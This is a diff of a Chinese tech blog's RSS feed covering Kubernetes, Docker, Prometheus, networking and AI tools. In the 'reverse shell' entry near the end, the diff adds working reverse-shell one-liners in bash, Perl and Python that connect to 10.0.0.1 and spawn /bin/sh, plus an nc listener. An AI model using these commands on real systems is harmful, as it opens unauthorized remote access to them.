@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Feisky</title><link>https://feisky.xyz/posts/</link><description>Recent content in Posts on Feisky</description><generator>Hugo</generator><language>zh-cn</language><lastBuildDate>Mon, 02 Aug 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://feisky.xyz/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Kubernetes 1.22 新特性预览</title><link>https://feisky.xyz/posts/2021-08-02-kubernetes-122/</link><pubDate>Mon, 02 Aug 2021 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2021-08-02-kubernetes-122/</guid><description>&lt;p>Kubernetes 1.22 &lt;a href="https://github.com/kubernetes/sig-release/tree/master/releases/release-1.22">将于 8 月 4 日发布&lt;/a>，本文带你一起来看看这个版本带来的新特性，以便你为新版本的测试升级做好准备。&lt;/p>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Feisky</title><link>https://feisky.xyz/posts/</link><description>Recent content in Posts on Feisky</description><generator>Hugo</generator><language>zh-cn</language><lastBuildDate>Wed, 08 Jan 2025 20:30:51 +0800</lastBuildDate><atom:link href="https://feisky.xyz/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>推荐一款 VSCode AI 插件 —— Chatgpt Copilot</title><link>https://feisky.xyz/posts/chatgpt-copilot/</link><pubDate>Wed, 08 Jan 2025 20:30:51 +0800</pubDate><guid>https://feisky.xyz/posts/chatgpt-copilot/</guid><description>&lt;p>今天我想和大家分享一个 &lt;strong>ChatGPT Copilot&lt;/strong> VSCode 插件。这是一款完全开源的 AI 助手, 目前在 VSCode 市场的下载量已突破 400k。它的核心功能非常简洁 - 在 VSCode 侧边栏中提供了一个灵活的类 ChatGPT 聊天工具。它不仅支持接入各种主流 AI 模型, 还允许用户在对话中添加文件和图片等聊天上下文。&lt;/p></description></item><item><title>构建高效的 AI 代理系统</title><link>https://feisky.xyz/posts/effective-agents/</link><pubDate>Mon, 06 Jan 2025 22:10:12 +0800</pubDate><guid>https://feisky.xyz/posts/effective-agents/</guid><description>&lt;p>题记：本文改编自 Anthropic 公司的研究报告《&lt;a href="https://www.anthropic.com/research/building-effective-agents">Building effective agents&lt;/a>》。原文发表于 2024 年 12 月 20 日, 由 Erik Schluntz 和 Barry Zhang 撰写。本文对原文进行了翻译、整理和补充, 旨在为中文读者提供关于构建高效 AI 代理系统的实用指南。&lt;/p></description></item><item><title>Kubernetes 1.32 新特性解析</title><link>https://feisky.xyz/posts/kubernetes-v1.32/</link><pubDate>Sat, 04 Jan 2025 15:41:42 +0800</pubDate><guid>https://feisky.xyz/posts/kubernetes-v1.32/</guid><description>&lt;p>Kubernetes v1.32 是一次充满意义的版本更新，它不仅标志着 Kubernetes 十周年的里程碑，更展现了社区在推动云原生计算领域技术发展的坚持与创新。本文将带你一起看一看 1.32 版本带来了哪些新的功能特性以及升级过程中需要注意的事项。&lt;/p></description></item><item><title>Kubernetes 1.22 新特性预览</title><link>https://feisky.xyz/posts/2021-08-02-kubernetes-122/</link><pubDate>Mon, 02 Aug 2021 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2021-08-02-kubernetes-122/</guid><description>&lt;p>Kubernetes 1.22 &lt;a href="https://github.com/kubernetes/sig-release/tree/master/releases/release-1.22">将于 8 月 4 日发布&lt;/a>，本文带你一起来看看这个版本带来的新特性，以便你为新版本的测试升级做好准备。&lt;/p>
 &lt;h2 id="删除一系列已弃用-api">删除一系列已弃用 API&lt;/h2>
 &lt;p>Kubernetes 1.22 最大的变化之一是删除了一系列已废弃的 API，包括：&lt;/p></description></item><item><title>基于Kubernetes的多集群实践</title><link>https://feisky.xyz/posts/2021-03-20-multi-cluster/</link><pubDate>Sat, 20 Mar 2021 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2021-03-20-multi-cluster/</guid><description>&lt;p>在 &lt;a href="https://mp.weixin.qq.com/s/uM4d3_fwLIdQ95fBWcmRjw">基于Kubernetes的多云和混合云&lt;/a> 文章中，我介绍了多云和混合云的由来以及常用方案。多云和混合云的目的主要有以下几个：&lt;/p>
 &lt;ul>
@@ -43,7 +43,7 @@
 &lt;p>在上一篇文章，我们想尽 “千方百计” 才好不容易把 Prometheus 优化到适配大规模场景，部署和后期维护麻烦且复杂不说，还有很多不完美的地方，并且还无法满足一些更高级的诉求，比如查看时间久远的监控数据，对于一些时间久远不常用的 “冷数据”，最理想的方式就是存到廉价的对象存储中，等需要查询的时候能够自动加载出来。&lt;/p></description></item><item><title>打造云原生大型分布式监控系统(一): 大规模场景下 Prometheus 的优化手段</title><link>https://feisky.xyz/posts/2020-04-06-prometheus-optimization/</link><pubDate>Mon, 06 Apr 2020 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2020-04-06-prometheus-optimization/</guid><description>&lt;blockquote>
 &lt;p>作者简介： 大家好，我是 roc，来自腾讯云容器服务(TKE)团队，这次为大家带来实用的打造云原生大型分布式监控系统系列文章，请笑纳。&lt;/p>
 &lt;/blockquote>
-&lt;!-- raw HTML omitted -->
+&lt;section style="font-family: Avenir, -apple-system-font, 微软雅黑, sans-serif;white-space: normal;font-size: 20px;color: rgb(0, 179, 139);text-align: left;line-height: 35px;margin-top: 40px;margin-right: 8px;margin-left: 8px;background-image: url("https://mmbiz.qpic.cn/mmbiz_jpg/YriaiaJPb26VOHGXWCfLWxnJBhCnaNGPLmIDXG2U5jVvle8nhWoF2Zh3sdAqr7kNvVVQ9LjgDLyGCia1ehjlRP1Eg/640?wx_fmt=jpeg");background-position: left 28px;background-repeat: no-repeat;background-attachment: initial;background-origin: initial;background-clip: initial;background-size: 100% 6px;">1概述&lt;/section>
 &lt;p>Prometheus 几乎已成为监控领域的事实标准，它自带高效的时序数据库存储，可以让单台 Prometheus 能够高效的处理大量的数据，还有友好并且强大的 PromQL 语法，可以用来灵活的查询各种监控数据以及配置告警规则，同时它的 pull 模型指标采集方式被广泛采纳，非常多的应用都实现了 Prometheus 的 metrics 接口以暴露自身各项数据指标让 Prometheus 去采集，很多没有适配的应用也会有第三方 exporter 帮它去适配 Prometheus，所以监控系统我们通常首选用 Prometheus，本系列文章也将基于 Prometheus 来打造云原生环境下的大型分布式监控系统。&lt;/p></description></item><item><title>Kubernetes 容器运行时演进</title><link>https://feisky.xyz/posts/kubernetes-container-runtime/</link><pubDate>Sun, 14 Oct 2018 22:08:45 +0800</pubDate><guid>https://feisky.xyz/posts/kubernetes-container-runtime/</guid><description>&lt;blockquote>
 &lt;p>注：本文是我在&lt;a href="http://ceuc.k8smeetup.com/part">中国云原生大会（CEUC 2018）&lt;/a> 上同名演讲的文字整理。&lt;/p>
 &lt;/blockquote>
@@ -820,7 +820,7 @@ mkdir -p ~/.config/awesome
 &lt;li>&lt;a href="http://www.rethinkdb.com/">RethinkDB&lt;/a> - document database that supports queries like table joins and group by.&lt;/li>
 &lt;/ul>
 &lt;h2 id="key-map-data-model">Key Map Data Model&lt;/h2>
-&lt;p>&lt;strong>Note&lt;/strong>: There is some term confusion in the industry, and two different things are called &amp;ldquo;Columnar Databases&amp;rdquo;. Some, listed here, are distributed, persistent databases built around the &amp;ldquo;key-map&amp;rdquo; data model: all data has a (possibly composite) key, with which a map of key-value pairs is associated. In some systems, multiple such value maps can be associated with a key, and these maps are referred to as &amp;ldquo;column families&amp;rdquo; (with value map keys being referred to as &amp;ldquo;columns&amp;rdquo;).&lt;/p></description></item><item><title>cannot change locale</title><link>https://feisky.xyz/posts/2015-02-10-cannot-change-locale/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-02-10-cannot-change-locale/</guid><description>&lt;p>运行locale命令&lt;!-- raw HTML omitted -->&lt;!-- raw HTML omitted -->&lt;br>
+&lt;p>&lt;strong>Note&lt;/strong>: There is some term confusion in the industry, and two different things are called &amp;ldquo;Columnar Databases&amp;rdquo;. Some, listed here, are distributed, persistent databases built around the &amp;ldquo;key-map&amp;rdquo; data model: all data has a (possibly composite) key, with which a map of key-value pairs is associated. In some systems, multiple such value maps can be associated with a key, and these maps are referred to as &amp;ldquo;column families&amp;rdquo; (with value map keys being referred to as &amp;ldquo;columns&amp;rdquo;).&lt;/p></description></item><item><title>cannot change locale</title><link>https://feisky.xyz/posts/2015-02-10-cannot-change-locale/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-02-10-cannot-change-locale/</guid><description>&lt;p>运行locale命令&lt;span id="more-912">&lt;/span>&lt;br>
 LANG=&lt;br>
 LANGUAGE=&lt;br>
 LC_CTYPE=&amp;ldquo;POSIX&amp;rdquo;&lt;br>
@@ -842,7 +842,19 @@ LC_ALL=&lt;/p>
 &lt;p>export LC_ALL=en_US.UTF-8&lt;/p>
 &lt;p>source /etc/profile&lt;/p>
 &lt;p>得到错误 setlocale: LC_ALL: cannot change locale (en_US.UTF-8): No such file or directory&lt;br>
- 运行 dpkg-reconfigure locales&lt;/p></description></item><item><title>Deploy a Mesos Cluster Using Docker</title><link>https://feisky.xyz/posts/2015-02-05-deploy-a-mesos-cluster-using-docker/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-02-05-deploy-a-mesos-cluster-using-docker/</guid><description>&lt;p>his tutorial will show you how to bring up a single node &lt;a href="http://mesosphere.com/">Mesos&lt;/a> cluster all provisioned out using &lt;a href="http://docker.io/">Docker&lt;/a> containers (a future post will show how to easily scale this out to multi nodes or see the update on the bottom). This means that you can startup an entire cluster with 7 commands! Nothing to install except for starting out with a working Docker server.&lt;/p>
+ 运行 dpkg-reconfigure locales&lt;/p>
+&lt;p>得到错误&lt;/p>
+&lt;p>perl: warning: Setting locale failed.&lt;br>
+perl: warning: Please check that your locale settings:&lt;br>
+        LANGUAGE = (unset),&lt;br>
+        LC_ALL = &amp;ldquo;en_US.UTF-8&amp;rdquo;,&lt;br>
+        LANG = &amp;ldquo;en_US.UTF-8&amp;rdquo;&lt;br>
+    are supported and installed on your system.&lt;br>
+perl: warning: Falling back to the standard locale (&amp;ldquo;C&amp;rdquo;).&lt;br>
+locale: Cannot set LC_CTYPE to default locale: No such file or directory&lt;br>
+locale: Cannot set LC_MESSAGES to default locale: No such file or directory&lt;br>
+locale: Cannot set LC_ALL to default locale: No such file or directory&lt;br>
+/bin/bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)&lt;/p></description></item><item><title>Deploy a Mesos Cluster Using Docker</title><link>https://feisky.xyz/posts/2015-02-05-deploy-a-mesos-cluster-using-docker/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-02-05-deploy-a-mesos-cluster-using-docker/</guid><description>&lt;p>his tutorial will show you how to bring up a single node &lt;a href="http://mesosphere.com/">Mesos&lt;/a> cluster all provisioned out using &lt;a href="http://docker.io/">Docker&lt;/a> containers (a future post will show how to easily scale this out to multi nodes or see the update on the bottom). This means that you can startup an entire cluster with 7 commands! Nothing to install except for starting out with a working Docker server.&lt;/p>
 &lt;p>This will startup 4 containers:&lt;/p>
 &lt;ol>
 &lt;li>ZooKeeper&lt;/li>
@@ -854,15 +866,17 @@ LC_ALL=&lt;/p>
 &lt;p>Capabilities in Linux are flags that tell the kernel what the application is allowed to do, If you have no additional security mechanism in place, the Linux root user has all capabilities assigned to it. As capabilities are a way for running processes with some privileges, without having the need to grant them root privileges, it is important to understand that they exist.&lt;/p>
 &lt;p>Consider the ping utility. It is marked setuid root on some distributions, because the utility requires the (cap)ability to send raw packets. This capability is known as CAP_NET_RAW. However, thanks to capabilities, you can now mark the ping application with this capability and drop the setuid from the file. As a result, the application does not run with full root privileges anymore, but with the restricted privileges of the user plus one capability, namely the CAP_NET_RAW.&lt;/p></description></item><item><title>Docker</title><link>https://feisky.xyz/posts/2015-01-27-docker/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-01-27-docker/</guid><description>&lt;h3 id="简介">简介&lt;/h3>
 &lt;p>Docker 是 dotCloud 最近几个月刚宣布的开源引擎，旨在提供一种应用程序的自动化部署解决方案，简单的说就是，在 Linux 系统上迅速创建一个容器（类似虚拟机）并在容器上部署和运行应用程序，并通过配置文件可以轻松实现应用程序的自动化安装、部署和升级，非常方便。因为使用了容器，所以可以很方便的把生产环境和开发环境分开，互不影响，这是 docker 最普遍的一个玩法。更多的玩法还有大规模 web 应用、数据库部署、持续部署、集群、测试环境、面向服务的云计算、虚拟桌面 VDI 等等。&lt;/p></description></item><item><title>Docker acquires SDN startup SocketPlane</title><link>https://feisky.xyz/posts/2015-03-05-docker-acquires-sdn-startup-socketplane/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-03-05-docker-acquires-sdn-startup-socketplane/</guid><description>&lt;p>At &lt;a href="http://socketplane.io/">Socketplane&lt;/a> we started out as four guys with a collectively strong belief in open source and open communities.  We aligned around a shared vision that we wanted to be a critical part of Docker’s once in a decade disruption. Now that we are &lt;a href="http://www.businesswire.com/news/home/20150304005595/en/Docker-Acquires-SocketPlane-Drive-Open-Collaborative-Networking#.VPcQAVPF-Tk">part of the Docker team&lt;/a>, we couldn’t be happier.&lt;/p>
-&lt;p>We never looked to hedge our bets, our success was and obviously still is tied to the success of Docker. While there are many reasons that we decided to join the team, first and foremost Docker is unlike any other projects we have worked on in the past; the focus on user experience and simplicity is unmatched. Our early work with Docker during the open network design sprints gave us clear indications that the Docker maintainers were interested in being good open source stewards for the networking community in a project with an already staggering community of users and contributors. We also saw a genuine desire from Docker leadership to do right by both, individual contributors and the ecosystem. That made it all the more easy to jump in head first.&lt;/p></description></item><item><title>docker in tencent</title><link>https://feisky.xyz/posts/2015-03-20-docker-in-tencent/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-03-20-docker-in-tencent/</guid><description>&lt;p>腾讯内部对Docker有着广泛的使用，其基于Yarn的代号为Gaia的调度平台可以同时兼容Docker和非Docker类型的应用，并提供高并发任务调度和资源管理，它具有高度可伸缩性和可靠性，能够支持MR等离线业务。&lt;/p></description></item><item><title>docker internal</title><link>https://feisky.xyz/posts/2015-01-27-docker-internal/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-01-27-docker-internal/</guid><description>&lt;p>&lt;!-- raw HTML omitted -->&lt;!-- raw HTML omitted -->docker-base&lt;!-- raw HTML omitted -->&lt;!-- raw HTML omitted -->&lt;!-- raw HTML omitted -->&lt;!-- raw HTML omitted -->Abstract&lt;!-- raw HTML omitted -->&lt;/p>
-&lt;!-- raw HTML omitted -->
-&lt;p>A &lt;em>subsystem&lt;/em> is a module that makes use of the task grouping
-facilities provided by cgroups to treat groups of tasks in
-particular ways. A subsystem is typically a &amp;ldquo;resource controller&amp;rdquo; that
-schedules a resource or applies per-cgroup limits, but it may be
-anything that wants to act on a group of processes, e.g. a
-virtualization subsystem.
-&lt;!-- raw HTML omitted -->&lt;!-- raw HTML omitted -->&lt;/p></description></item><item><title>git commit修改前一次提交的方法</title><link>https://feisky.xyz/posts/2015-06-05-git-commit/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-06-05-git-commit/</guid><description>&lt;p>方法一：用–amend选项&lt;/p>
+&lt;p>We never looked to hedge our bets, our success was and obviously still is tied to the success of Docker. While there are many reasons that we decided to join the team, first and foremost Docker is unlike any other projects we have worked on in the past; the focus on user experience and simplicity is unmatched. Our early work with Docker during the open network design sprints gave us clear indications that the Docker maintainers were interested in being good open source stewards for the networking community in a project with an already staggering community of users and contributors. We also saw a genuine desire from Docker leadership to do right by both, individual contributors and the ecosystem. That made it all the more easy to jump in head first.&lt;/p></description></item><item><title>docker in tencent</title><link>https://feisky.xyz/posts/2015-03-20-docker-in-tencent/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-03-20-docker-in-tencent/</guid><description>&lt;p>腾讯内部对Docker有着广泛的使用，其基于Yarn的代号为Gaia的调度平台可以同时兼容Docker和非Docker类型的应用，并提供高并发任务调度和资源管理，它具有高度可伸缩性和可靠性，能够支持MR等离线业务。&lt;/p></description></item><item><title>docker internal</title><link>https://feisky.xyz/posts/2015-01-27-docker-internal/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-01-27-docker-internal/</guid><description>&lt;p>&lt;/style>&lt;title>docker-base&lt;/title>&lt;/head>&lt;body>&lt;h2 id="abstract">Abstract&lt;/h2>&lt;/p>
+&lt;p>本文在现有文档的基础上总结了以下几点内容&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>docker的介绍，包括由来、适用场景等&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>docker背后的一系列技术 - namespace, cgroup, lxc, aufs等&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>docker在利用LXC的同时提供了哪些创新&lt;/p></description></item><item><title>git commit修改前一次提交的方法</title><link>https://feisky.xyz/posts/2015-06-05-git-commit/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-06-05-git-commit/</guid><description>&lt;p>方法一：用–amend选项&lt;/p>
 &lt;pre tabindex="0">&lt;code>#修改需要修改的地方。
 git add .
 git commit –amend
@@ -891,11 +905,16 @@ git commit –amend
 &lt;p>So what we need ?&lt;/p>
 &lt;p>In my case a &lt;a href="https://www.digitalocean.com/?refcode=16e2312f412e" title="Digital Ocean">Digital Ocean&lt;/a> droplet (I&amp;rsquo;m using Fedora 21).&lt;/p>
 &lt;p>So, first of all we connect to our vm with ssh.&lt;/p>
-&lt;!-- raw HTML omitted -->
-&lt;!-- raw HTML omitted -->
+&lt;pre class="code literal-block">
+&lt;span class="nv">$ &lt;/span>ssh root@yourvmip
+&lt;/pre>
 &lt;p>Now that we are inside we need to install git, Docker and docker-compose.&lt;/p>
-&lt;!-- raw HTML omitted -->
-&lt;!-- raw HTML omitted -->
+&lt;pre class="code literal-block">
+&lt;span class="nv">$ &lt;/span>yum -y install git docker python-pip
+&lt;span class="nv">$ &lt;/span>pip install docker-compose&lt;span class="o">==&lt;/span>1.1.0-rc2
+&lt;span class="nv">$ &lt;/span>systemctl start docker
+&lt;span class="nv">$ &lt;/span>systemctl &lt;span class="nb">enable &lt;/span>docker
+&lt;/pre>
 &lt;p>That&amp;rsquo;s all we need to play with Docker.&lt;/p></description></item><item><title>Hypernetes The multi tenant Kubernetes distribution</title><link>https://feisky.xyz/posts/2015-11-04-hypernetes---the-multi-tenant-kubernetes-distribution/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-11-04-hypernetes---the-multi-tenant-kubernetes-distribution/</guid><description>&lt;p>&amp;ldquo;&lt;a href="https://hyper.sh/blog/post/2015/07/06/the-caas-revolution.html">The Caas Revolution&lt;/a>&amp;rdquo;. This is what we believe is happening today in the Cloud ecosystem. This revolution has been started by the now famous project (and company) &lt;a href="http://www.docker.com/">Docker&lt;/a>, and embraced by Cloud providers like &lt;a href="https://cloud.google.com/container-engine/">Google&lt;/a> and &lt;a href="https://aws.amazon.com/ecs/">AWS&lt;/a>.&lt;/p>
 &lt;p>However, most multi-tenant CaaS solutions today run on a public IaaS, and use fully isolated virtual machine clusters to schedule containers. This is in contrast to the solely container-based implementation provided in private CaaS deployments. The public “hybrid” VM/container isolation approach is a direct result from the shared kernel architecture in container technology.&lt;/p></description></item><item><title>Hypernetes wechat share</title><link>https://feisky.xyz/posts/2015-11-12-hypernetes-wechat-share/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-11-12-hypernetes-wechat-share/</guid><description>&lt;p>今天给大家介绍下最近在Hypernetes上做的工作。&lt;/p>
 &lt;p>Hypernetes是一个真正多租户的Kubernetes Distro。&lt;/p>
@@ -946,14 +965,14 @@ I started with the Fedora 21 Cloud Image, because I&amp;rsquo;m installing onto 
 &lt;p>OpenFlow Tutorial: &lt;a href="https://github.com/mininet/openflow-tutorial/wiki">https://github.com/mininet/openflow-tutorial/wiki&lt;/a>&lt;/p>
 &lt;p>Mininet walkthrough: &lt;a href="http://mininet.org/walkthrough/">http://mininet.org/walkthrough/&lt;/a>&lt;/p>
 &lt;p>RYU SDN Framework: &lt;a href="http://osrg.github.io/ryu-book/en/html/">http://osrg.github.io/ryu-book/en/html/&lt;/a>&lt;/p>
-&lt;p>A good ryu blog: &lt;a href="http://linton.tw/">http://linton.tw/&lt;/a>&lt;/p></description></item><item><title>Open vSwitch over DPDK on Ubuntu</title><link>https://feisky.xyz/posts/2015-03-02-open-vswitch-over-dpdk-on-ubuntu/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-03-02-open-vswitch-over-dpdk-on-ubuntu/</guid><description>&lt;p>There are two approaches for using DPDK acceleration in DPDK. One is the openvswitch fork from intel, called dpdk-ovs the other is done directly in openvswitch with a different approach from intel. &lt;!-- raw HTML omitted -->&lt;!-- raw HTML omitted -->
-&lt;!-- raw HTML omitted -->&lt;!-- raw HTML omitted -->&lt;!-- raw HTML omitted -->&lt;!-- raw HTML omitted -->&lt;/p>
+&lt;p>A good ryu blog: &lt;a href="http://linton.tw/">http://linton.tw/&lt;/a>&lt;/p></description></item><item><title>Open vSwitch over DPDK on Ubuntu</title><link>https://feisky.xyz/posts/2015-03-02-open-vswitch-over-dpdk-on-ubuntu/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-03-02-open-vswitch-over-dpdk-on-ubuntu/</guid><description>&lt;p>There are two approaches for using DPDK acceleration in DPDK. One is the openvswitch fork from intel, called dpdk-ovs the other is done directly in openvswitch with a different approach from intel. &lt;span class="anchor" id="line-10">&lt;/span>
+&lt;span class="anchor" id="line-11">&lt;/span>&lt;span class="anchor" id="line-12">&lt;/span>&lt;/p>
 &lt;ul>
-&lt;li>&lt;a href="http://dpdk.org/ml/archives/dev/2014-March/001770.html">http://dpdk.org/ml/archives/dev/2014-March/001770.html&lt;/a> &lt;!-- raw HTML omitted -->&lt;!-- raw HTML omitted -->
-&lt;!-- raw HTML omitted -->&lt;!-- raw HTML omitted -->- &lt;a href="https://github.com/01org/dpdk-ovs">https://github.com/01org/dpdk-ovs&lt;/a> &lt;!-- raw HTML omitted -->&lt;!-- raw HTML omitted -->&lt;!-- raw HTML omitted -->&lt;!-- raw HTML omitted -->&lt;/li>
+&lt;li>&lt;a href="http://dpdk.org/ml/archives/dev/2014-March/001770.html">http://dpdk.org/ml/archives/dev/2014-March/001770.html&lt;/a> &lt;span class="anchor" id="line-13">&lt;/span>
+&lt;span class="anchor" id="line-14">&lt;/span>- &lt;a href="https://github.com/01org/dpdk-ovs">https://github.com/01org/dpdk-ovs&lt;/a> &lt;span class="anchor" id="line-15">&lt;/span>&lt;span class="anchor" id="line-16">&lt;/span>&lt;/li>
 &lt;/ul>
-&lt;h2 id="virtualbox-preparationsspan-classanchor-idline-17span">VirtualBox preparations&lt;!-- raw HTML omitted -->&lt;!-- raw HTML omitted -->&lt;/h2>
-&lt;p>To run openvswitch with DPDK I used a virtual machine (&lt;a href="https://wiki.linaro.org/VirtualBox">VirtualBox&lt;/a>) because the NIC I had on my laptop was not supported. I created three virtual NICs for my vm, one behind NAT to use it to ssh into the vm from the host, and two in host-only mode, to be use for testing. &lt;!-- raw HTML omitted -->&lt;!-- raw HTML omitted -->&lt;!-- raw HTML omitted -->&lt;!-- raw HTML omitted -->&lt;/p></description></item><item><title>OpenStack Magnum社区及项目介绍</title><link>https://feisky.xyz/posts/2015-06-24-openstack-magnum/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-06-24-openstack-magnum/</guid><description>&lt;p>&lt;img src="https://feisky.xyz/images/magnum.png" alt="">&lt;/p>
+&lt;h2 id="virtualbox-preparationsspan-classanchor-idline-17span">VirtualBox preparations&lt;span class="anchor" id="line-17">&lt;/span>&lt;/h2>
+&lt;p>To run openvswitch with DPDK I used a virtual machine (&lt;a href="https://wiki.linaro.org/VirtualBox">VirtualBox&lt;/a>) because the NIC I had on my laptop was not supported. I created three virtual NICs for my vm, one behind NAT to use it to ssh into the vm from the host, and two in host-only mode, to be use for testing. &lt;span class="anchor" id="line-18">&lt;/span>&lt;span class="anchor" id="line-19">&lt;/span>&lt;/p></description></item><item><title>OpenStack Magnum社区及项目介绍</title><link>https://feisky.xyz/posts/2015-06-24-openstack-magnum/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-06-24-openstack-magnum/</guid><description>&lt;p>&lt;img src="https://feisky.xyz/images/magnum.png" alt="">&lt;/p>
 &lt;p>Add network management for native docker &lt;a href="https://blueprints.launchpad.net/magnum/+spec/native-docker-network">https://blueprints.launchpad.net/magnum/+spec/native-docker-network&lt;/a>&lt;/p>
 &lt;p>&lt;a href="https://etherpad.openstack.org/p/magnum-native-docker-network">https://etherpad.openstack.org/p/magnum-native-docker-network&lt;/a>&lt;/p>
 &lt;p>From &lt;a href="http://dockone.io/article/445">http://dockone.io/article/445&lt;/a>&lt;/p></description></item><item><title>OVS 2.0 call flow</title><link>https://feisky.xyz/posts/2015-03-04-ovs-20-call-flow/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-03-04-ovs-20-call-flow/</guid><description>&lt;p>&lt;img src="https://feisky.xyz/images/ovs_flow.jpg" alt="">&lt;/p>
@@ -1040,19 +1059,27 @@ print os.path.dirname(os.path.abspath(__file__))
 &lt;p>What can you expect from the Red Hat Enterprise Linux 7 Atomic Host Beta?&lt;/p>
 &lt;h4 id="specifically-designed-to-run-containers">Specifically Designed to Run Containers&lt;/h4>
 &lt;p>Red Hat Enterprise Linux 7 Atomic Host Beta provides a streamlined host platform that is optimized to run application containers. The software components included in Red Hat Enterprise Linux 7 Atomic Host Beta, as well as the default system tunings, have been designed to enhance the performance, scalability and security of containers, giving you the optimal platform on which to deploy and run application containers.&lt;/p></description></item><item><title>reverse shell</title><link>https://feisky.xyz/posts/2015-01-28-reverse-shell/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-01-28-reverse-shell/</guid><description>&lt;h3 id="listen-for-8080-first">Listen for 8080 first&lt;/h3>
-&lt;!-- raw HTML omitted -->
-&lt;!-- raw HTML omitted -->
+&lt;pre>
+nc -l -p 8080 -vvv
+&lt;/pre>
 &lt;h3 id="bash">Bash&lt;/h3>
 &lt;p>Some versions of &lt;a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/">bash can send you a reverse shell&lt;/a> (this was tested on Ubuntu 10.10):&lt;/p>
-&lt;!-- raw HTML omitted -->
-&lt;!-- raw HTML omitted -->
+&lt;pre>
+bash -i >&amp; /dev/tcp/10.0.0.1/8080 0>&amp;1
+&lt;/pre>
 &lt;h3 id="perl">PERL&lt;/h3>
 &lt;p>Here’s a shorter, feature-free version of the &lt;a href="http://pentestmonkey.net/tools/web-shells/perl-reverse-shell">perl-reverse-shell&lt;/a>:&lt;/p>
-&lt;!-- raw HTML omitted -->
-&lt;!-- raw HTML omitted -->
+&lt;pre>
+perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&amp;S");open(STDOUT,">&amp;S");open(STDERR,">&amp;S");exec("/bin/sh -i");};'
+&lt;/pre>
 &lt;p>There’s also an &lt;a href="http://www.plenz.com/reverseshell">alternative PERL revere shell here&lt;/a>.&lt;/p>
 &lt;h3 id="python">Python&lt;/h3>
-&lt;p>This was tested under Linux / Python 2.7:&lt;/p></description></item><item><title>Setting up GRE for Kubernetes</title><link>https://feisky.xyz/posts/2015-03-02-setting-up-gre-for-kubernetes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-03-02-setting-up-gre-for-kubernetes/</guid><description>&lt;p>首先修改Docker的默认网桥：&lt;/p>
+&lt;p>This was tested under Linux / Python 2.7:&lt;/p>
+&lt;pre>
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+&lt;/pre>
+&lt;h3 id="php">PHP&lt;/h3>
+&lt;p>This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…&lt;/p></description></item><item><title>Setting up GRE for Kubernetes</title><link>https://feisky.xyz/posts/2015-03-02-setting-up-gre-for-kubernetes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-03-02-setting-up-gre-for-kubernetes/</guid><description>&lt;p>首先修改Docker的默认网桥：&lt;/p>
 &lt;pre tabindex="0">&lt;code>#停止Docker Daemon进程
 systemctl stop docker
 
